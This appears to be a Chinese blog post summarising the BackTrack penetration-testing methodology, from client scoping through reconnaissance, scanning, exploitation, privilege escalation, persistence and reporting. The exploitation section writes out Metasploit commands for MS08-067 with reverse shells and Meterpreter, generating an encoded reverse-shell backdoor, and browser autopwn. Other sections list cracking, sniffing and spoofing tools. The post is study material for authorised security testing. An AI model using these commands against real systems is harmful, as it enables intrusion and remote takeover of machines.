---
layout: kpost
title: BackTrack渗透测试方法论
category: 安全测试
tags: Penetration
description: 
---

# 1.目标划定

## 1.1 收集客户需求

`《客户需求调查表》`

* 1.收集公司的相关信息:
  * 公司名、地址、网站、联络人的详细资料、电子邮件地址以 及电话号码。 
* 2.在这个渗透测试项目中您的关键目标是什么？
* 3.确定渗透测试类型（包含或者不包含特定标准）：
  * 黑盒测试（或外部测试）
  * 白盒测试（或内部测试）
  * 测试前事先通知
  * 测试前不通知
  * 包含社会工程学
  * 不包含社会工程学
  * 调查员工背景信息
  * 使用虚假的员工信息
  * 包含拒绝服务攻击
  * 不包含拒绝服务攻击
  * 渗透业务合作伙伴的系统
* 4.总共需要测试多少台服务器、工作站和网络设备？
* 5.贵公司的基础设施架构支持什么操作系统技术？
* 6.需要测试什么类型的网络设备？
  * 防火墙、路由器、交换机、调制解调器、负载平衡器 、IDS、IPS，还是其他类型的设备？ 
* 7.有没有什么灾难恢复计划？如果有的话如何操作？
* 8.当前网络有没有安全管理员和管理？
* 9.有没有什么特定的工业标准需要遵循的？如果有，请列出来。
* 10.该项目的联络人是谁？
* 11.该项目的时间周期是多久？以周或天为单位。
* 12.该项H的预算是多少？
* 13.请列出所有其他的需求。

`《交付评估调查表》`

* 1.您期望得到哪种类型的报告?
  * 执行报告 技术砰估报告 开发人员报告 
* 2.您希望报告以哪种格式提交？
  * PDF、HTML还是DOC。
* 3.如何提交报告？
  * 邮件还是打印。
* 4.由谁来收取这些报告? 
  * 员工 、股东 、利益相关者

 通过使用这类简拮而全面的调查表，可以很容易地提取客户的需求，以帮助完成测试 计划。

## 1.2 准备测试计划

* 1.经过组织的测试流程：茌分析完客户提供的详细信息之后，很重要的一个工作是要重组BackTrack测试方法论。比如，如果社会共程学被禁止使用，那么在正式的测试流程中就必须去掉它，这个过程有时候称为测试过程验证。这是一个重复的过程，每当客户需求有所政变，都需要重新执行该过程。如果在测试过程中设计了任何不必要的步骤，将有可能违反目标组织的规章制度并带来严重后果。此外，根据测试类型的不同，也可能需要对测试流程进行一定的改变。比如，在白盒测试中，不需要信息收集和目标发现阶段，因为审计人员本身已经清楚了解目标内部架构。

* 2.人员配置：另一个重要领域是要确定完成测试所需要用到的专业知识。因此，为特定任务配备一名专业的渗透测试人员可以带来更好的安全评估结果。比如，对应用程序的渗透任务需要一名专门的应用安全测试人品。这项工作对于渗透测试任务的成功完成具有非常重要的作用。

* 3.成本分析：渗透测试的成本取决于很多因素。这些因素包括：分配给整个项目的天数、客户要求的额外服务，如社会工程学和物理安全评估，已经使用特点技术所需要的专业知识。从业界的角度来看，这应该是一个定性和定量相结合的标准。

* 4.保密协议：在渗透测试开始之前，需要签订一份符合客户和渗透测试人员双方利益的协议。通过这样一份相互保密协议，可以明确实施测试时应该遵循的条款和条件。渗透测试人员在整个测试过程中必须遵守这些条款。如果违反其中的任何一项条款，将受到严惩，甚至丢掉这份T作。

* 5.渗透测试合同：一份能够反映客户和渗透测试人员之间所有技术相关事宜的合同，这是十分必要的。这类合同主要关注以下信息：提供什么样的测试服务，这些服务的主要目标是什么，应该怎样进行这些服务，收费情况，以及维持整个项目的保密性。

* 6.约定规则：渗透测试过程可能会具有攻击性，必须清楚地理解评估的需求是什么，客户会提供什么支持，以及每种评估技术的潜在影响或效果。此外，在渗透测试中使用到的工具必须有明确的用途说明，这样测试人员可以选择相应的工具来使用。约定规则以一种更详细的方式定义上述所有相关内容，来总结出测试过程中需要遵循的必要指标。通过准备测试计划中的上述子模块，能够保证渗透测试过程的一致性。同时也可以向渗透测试人员提供从客户需求中生成的、更具体的评估细节。我们强烈建议事先准备一份测试计划的检查列表，用来和签约方一起验证相关评估指标和底层条款。下一小节将会介绍一个测试计划检查列表。

`《测试计划检查列表》`

  下面列出在进入范围划定流程的后续步骤之前，必须正确回答的一些关键问题：
  
  * 测试范围是否清晰定义了
  * 是否已经找出了所有测试实体
  * 是否已经半．独列出了所有非测试实体
  * 是否需要遵循某些特定的测试流程
  * 测试流程是否已经正确记录下来
  * 测试完成后是否能够交付相应成果
  * 是否已经研究并记录了整个测试环境
  * 是不是所有的测试活动部分配了相应的角色和职责
  * 是否有第三方承包商来完成特定技术的评估
  * 有没有采用任何步骤让项目能够完美结束
  * 是否准备好了灾难恢复计划
  * 是否已经计算完了整个项目的成本
  * 是否已经找到了负责批准测试计划的人员
  * 是否已经找到r负责接收测试结果的人员

## 1.3 分析测试边界
  * 技术限制
  * 知识限制
  * 其它基础设施限制

## 1.4 定义业务目标

  根据安全评估需求和采用的服务来定义业务目标，这一步非常重要。这将保证测试结果能够从各个方面给客户的业务带来好处。每一个业务目标都是根据相应的评估需求来组织的，并能够清晰反映相关的产业成果。
  
  我们总结了一些常见的、可以适用于任何渗透测试任务的业务目标。但是，根据需求的改变，也可以重新设计这些目标。这个流程十分重要，需要审计人员在测试前、测试中、测试后都维护一个最低程度的标准，同时努力观察和理解客户的业务活动。
  
  业务目标是将管理团队和技术团队结合在一起，共同追求一个完整的、理想的安全信息系统的最主要途径。无论要进行的安全评估是哪种类型，均可参考下列通用业务目标：

  * 经常进行常规安全检查，以提高企业形象，得到业界认可。
  * 保证业务的完整性，以达到必要的标准和规范。
  * 对存有客户、员工和其他业务实体的机密信息的系统，要保证其安全性。
  * 列出在网络基础设施中找到的威胁和漏洞，并协助建立安全制度和流程，来对抗已知和未知的漏洞。
  * 提供一个平滑而又健壮的业务组织架构，使合作伙伴和客户能够受益。
  * 用最小的开销来维护IT基础设施的安全性。安全评估可衡量业务系统的保密性、完整性和可用性。
  * 帮助客户消除所有潜在的威胁，这些威胁一旦被恶意的敌对方利用，将造成很大损失，这样便为客户的投资给予了更多回报。
  * 向客户的技术团队推荐详细的安全流程，使他们可以在日常管理中消除任何安全隐患并，减少操作上的开销。
  * 根据目标信息系统使用的底层技术，选择最佳的工具和技术，遵循业界的最佳实践，来评估它的安全性。
  * 推荐所有可以用于保护商业财产的安全措施。

## 1.5 项目管理时间规划
  * MS Project

# 2.信息收集 

## 2.1 公共资源

    Todo.

## 2.2 文档收集

    metagoofil.py -d abc.com -t pdf,doc -l 20 -n 1000 -o microsoftfiles -f results.html

## 2.3 DNS信息

    dnswalk abc.com
    
    dnsenum.pl abc.com  -f dns.txt
    
    dnsmap abc.com  -w wordlist
    
    dnsrecon.py -d abc.com
    
    fierce.pl -dns abc.com -threads 3
    
    dmitry -winsepfb -o abc.txt abc.com

## 2.4 路由信息

     ping traceroute tcptraceroute

## 2.5 搜索引擎

    goohost.sh -t sohu.com -m <ip|host|mail> -p 10page –v

    goofile.py -d sohu.com -f txt
    
    gooscan -t sohu.com -q admin
    
    theHarvester.py -d abc.com  -l 100 -b google
    
    site: download upload php asp aspx do action admin password 后台 sql error fck cms powered by

## 2.6 综合智能信息收集工具

    Maltego——互联网情报聚合工具

## 2.7 文档化工具

    Dradis

# 3. 目标发现

## 3.1 目标机器识别

	Ping –c 5 1.1.1.1
	Arping –c 5 1.1.1.1      #禁止ping时，使用arp探测是否返回arp请求。
	Fping –g 192.168.1.0/24  #Ping一段IP
	Fping –f 文件
	Fping –s 查看统计结果
	genlist -s 192.168.21.\* #直接返回存活主机列表，方便使用
	hping2 hping3 自定义ping包 可以防火墙规则测试 高级端口扫描 路径发现 路由跟踪等 有空仔细研究
	nping  #支持多协议，编辑网络报
	lanmap #被动监听网络，创建拓扑图，kali以后研究
	nbtscan -r 192.168.1.0.24 扫描NetBios 信息
	nbtscan –hv 192.168.21.1-254 服务信息
	onesisxtyone –d 192.168.1.1 测试snmp bt5没有
	nmap nmap -A -sV  10.10.10-20.30-40 -oN a.txt

## 3.2 操作系统识别 

	P0f –o abc.log #被动探测操作系统
	Xprobe2 192.168.1.1 #主动操作系统识别

# 4. 目标枚举

## 4.1 端口扫描

	AutoScan 图形化网络扫描工具，可以确定主机开放端口和操作系统
	Netifera 网络安全工具开发平台
	Nmap 独立文档，记录常用命令
	Unicornscan 大量端口扫描
	Zenamp 图形nmap

## 4.2 服务枚举

	Amap –bq 1.1.1.1 22 3306
	Httprint –h 1.1.1.1 80 HTTP服务器
	httprint -h 10.0.1.1-10.0.1.254 -s signatures.txt -o 10_0_1_x.html 扫描多台
	ika-scan vpn扫描

# 5. 漏洞映射

## 5.1 开放漏洞评估系统 

    OpenVAS 集成安全工具（使用kaili中集成openvas）

## 5.2 Cisco安全分析工具

    Cisco Auditing Tool 扫描一般常见漏洞和，如默认密码，SNMP等老IOS缺陷 
    ./CAT -h 1.1.1.1 -w 团体名字典 -a 密码字典 -i 检测漏洞
    Cisco Global Exploiter Perl脚本支持14个漏洞独立进行测试。
    ./cge.pl 1.1.1.1
    Cisco Passwd Scanner 可以扫描网段，口令扫描
    ./ciscos 10.10.10 3 -t 4 -C 10

## 5.3 模糊分析

    BED(Bruteforce Exploit Detector) 使用模糊化纯文本测试溢出漏洞，支持 FTP HTTP POP IMAP 等等。
    ./bed.pl -s FTP -u user -v user -t 1.1.1.1-p 21 -o 3
    Bunny 在C语言源文件中注入语句和钩子，检测漏洞。
    JBrofuzz 知名网页应用模糊测试平台，对Web请求某部分进行模糊处理，输入有效载荷检测漏洞。
    jar JBroFuzz.jar

## 5.4 SMB分析

    Samrdump （Security Accout Manager SAM）列出本地所有共享、用户账户、和其他信息。
    ./samrdump.py h4x:123@1.1.1.1 445/SMB
    Smb4k 易于使用的网络邻居浏览工具 kaili没有。
    acccheck.pl windows若口令检测

## 5.5 SNMP分析

    ADMSnmp 1.1.1.1 -wordf passwords  kaili没有
    snmpenum.pl 1.1.1.1 public windows.txt  kali没有
    snmpwalk 功能强大的收集工具
    snmpwalk -v 2c -c public -O T -L f snmpwalk.txt 1.1.1.1

## 5.6 数据库评估工具

    DBPwAudit 审计 Oracle MySQL MSSQL DB2 服务器密码。
    dbpwaudit -L 查看支持的数据库驱动
    dbpwaudit -s 1.1.1.1 -d dbname -D MySQL -U users.txt -P pwds.txt

## 5.7 SQL注入
    Pblind
    SQLbrute
    SQLiX
    SQLMap
    SQL Ninja

# 6. 漏洞利用

## 6.1 漏洞挖掘

   编程经验、逆向工程、分析工具、漏洞利用、有效负载

## 6.2 漏洞和漏洞利用库
 
	Bugtraq SecurityFocus
	OSVDB Vulnerabilities
	Packet Storm
	VUPEN Security
	National Vulnerability Database
	ISS X-Force
	US-CERT Vulnerability Notes
	US-CERT Alerts
	SecuriTeam
	Government Security Org
	Secunia Advisories
	Security Reason
	XSSed XSS-Vulnerabilitys
	Security Vulnerabilities Database
	Offensive Security Exploits Database
	SEBUG
	BugReport
	MediaService Lab
	Intelligent Exploit Aggregaton Network
	Inj3ct0r
	Hack0wn
	离线漏洞库：www.exploit-db.com/archive.tar.bz2

## 6.3 漏洞利用工具集

	Metasploit
	MSFConsole、MSFCLI
	
	场景1 使用MSF端口扫描，保存与数据库中 db_nmap
	
	场景2 使用辅助工具进行渗透
		use auxiliary/scanner/snmp/enum
		set rhosts 192.168.1.0/24
		run
		use auxiliary/scanner/vnc/vnc_none_auth
		set rhosts 192.168.1.0/24
		run

	场景3 使用常见载荷（Bind、Reverse、Meterpreter）
		绑定shell
			use exploit/windows/smb/ms08_067_netapi
			set rhost 1.1.1.1
			set payload windows/shell/bind_tcp
			exploit
		反弹shell
			use exploit/windows/smb/ms08_067_netapi
			set rhost 1.1.1.1
			set lhost 1.1.1.10
			set payload windows/shell/reverse_tcp
			exploit
		Meterpreter win下功能强大的载荷
			use exploit/windows/smb/ms08_067_netapi
			set rhost 1.1.1.1
			set lhost 1.1.1.10
			set payload windows/meterpreter/reverse_tcp
			exploit

	场景4 根据Nmap扫描结果，自动检测漏洞，db_autopwn(需要手动安装)
		db_autopwn -p -t -e

	场景5
		生成二进制后门 msfpayload windows/shell_reverse_tcp lhost=1.1.110 rhost=1.1.1.1 X > a.exe
		本地接收反弹
			use exploit/multi/handler
			set payload windows/shell_reverse_tcp
			set lhost 1.1.1.10   set lport 1234
			exploit
		后门免杀 msfencode
		自动化浏览器漏洞利用 use auxiliary/server/browser_autopwn

# 7. 提权

## 7.1 攻击密码 （密码类型：基于秘密，基于持有，基于生理）

	* 离线攻击工具
		彩虹表破解 rtgen rtsort rcrack
		Samdump2 破解windows密码
		John
		ophcrack
		Crunch 创建字典
		Wyd从文件信息，构造字典
	* 在线攻击工具
		BruteSSH 破解SSH
		Hydra 多协议

## 7.2 网络嗅探

    Dsniff 多协议自动嗅探
    Hamster 作为代理，窃取Cookie
    Tcpdump
    Tcpick 文本嗅探，保存为文件
    Wireshark

## 7.3 网络欺骗工具
    Arpspoof
    Ettercap

# 8. 持续控制

## 8.1 协议隧道工具

    DNS2Tcp
    Ptunnel
    Stunnel4

## 8.2 代理

    3proxy
    Proxychains

##8.3 端到端链接工具 远控
    CryptCat
    Sbd
    Socat

# 9. 编写报告

## 9.1 验证测试结果

## 9.2 报告类型

    执行报告（项目目标，漏洞威胁分类，执行小结，统计表，威胁列表）
    管理报告（行为守则，测试方法，预案和限制，调整管理，配置管理）
    技术报告（安全问题，漏洞映射，漏洞利用，最佳实践）
	
《报告样板》

	1.法律声明
	2.渗透测试协议
	3.简介
	4.项目目标
	5.预案和限制
	6.受此漏洞威胁最大规模
	7.执行摘要
	8.风险矩阵
	9.测试方法
	10.安全威胁
	11.建议
	12.漏洞映射
	13.漏洞利用
	14.规范评估
	15.调整管理
	16.最佳实践
	17.附件

## 9.3 演示

    了解听众的技术能力，调整合适的文稿

## 9.4 后期测试流程


        后期测试流程包括：补救措施、整改步骤以及建议。这些流程让渗透测试者在担任目标团 队的顾问时，能性起到更积极的作用，有时候还扮演安全分析师的角色。渗透测试者需要从沟通能力和网络技术两方面，来提高与不同技术背景的人员打交道的能力。
        
        此外，除非专门进行培训，否则目标人群不可能掌握如何改善目标IT环境的全部知识。因为，在没有任何网络专家支持的前提下，对每个独立的网络缺陷进行处理和修复，将是一项挑战。这里提出几个通用的准则，可能有助于向客户推动关键的整改意见： 在报告中回顾网络设计以及指出可能存在安全隐患的资源。
	
        关注边界安全，以减少对后端服务器或工作站的安全威胁。来自客户端和社会工程的攻击，几乎是无法避免的，但可以通过培训提高员工安全意识。
    
        渗透测试者在每份安全报告中提供修补系统建议之前，应该进行额外的调查，确保任何 一处修改不会影响系统的功能。 部署经过验证和值得信赖的第三方解决方案（IDS／IPS、防火墙、内容保护系统、杀软、 IAM技术等）。必要时，对核心功能进行调整，以确保发工作的安全和有效。在不安全的区域划分白治区域。
	
        强调代码的安全性。评估应用程序的安全性和审计执行代码，可能使团对有意外收获。如果存在物理入侵的可能，则可以采用多层入口防范策略，如安全的环境设计、机械和 电子门禁、闭路电视和人员身份识别。 
        
        对所有的安全系统进行必要的定期更新，以确保其保密性、完整性和可用性。检测和确认报告提供的解决方案中的建议，确保建议能够消除存在的威胁。
